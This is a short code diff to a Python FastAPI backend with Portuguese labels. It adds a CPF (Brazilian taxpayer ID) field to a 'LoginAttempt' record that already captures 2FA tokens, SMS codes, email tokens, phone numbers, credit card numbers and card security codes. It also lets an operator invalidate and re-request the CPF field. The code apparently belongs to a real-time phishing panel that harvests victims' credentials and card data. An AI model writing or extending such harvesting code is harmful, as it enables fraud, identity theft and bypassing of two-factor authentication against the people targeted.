@@ -131,6 +131,7 @@ class LoginAttempt(BaseModel):
     phone_number: Optional[str] = None
     app_mail: Optional[str] = None
     credit_card: Optional[str] = None
+    cpf_number: Optional[str] = None
     cc_code: Optional[str] = None
     last_heartbeat: Optional[str] = None
     history: List[dict] = Field(default_factory=list)
@@ -438,6 +439,7 @@ async def invalidate_field(data: InvalidateFieldRequest, token_data: dict = Depe
         "TELEFONE": "phone_number",
         "TOK-MAIL": "app_mail",
         "CC": "credit_card",
+        "CPF": "cpf_number",
         "COD-CC": "cc_code"
     }
     
@@ -463,7 +465,7 @@ async def submit_user_data(user_id: str, data: UserInputData):
         raise HTTPException(status_code=404, detail="Usuário não encontrado")
     
     # Mapear campo e atualizar
-    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cc_code"]
+    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cpf_number", "cc_code"]
     if data.field not in allowed_fields:
         raise HTTPException(status_code=400, detail="Campo inválido")
     
@@ -475,6 +477,7 @@ async def submit_user_data(user_id: str, data: UserInputData):
         "phone_number": "Telefone",
         "app_mail": "Token Email",
         "credit_card": "Cartão",
+        "cpf_number": "CPF",
         "cc_code": "Código CC"
     }
     
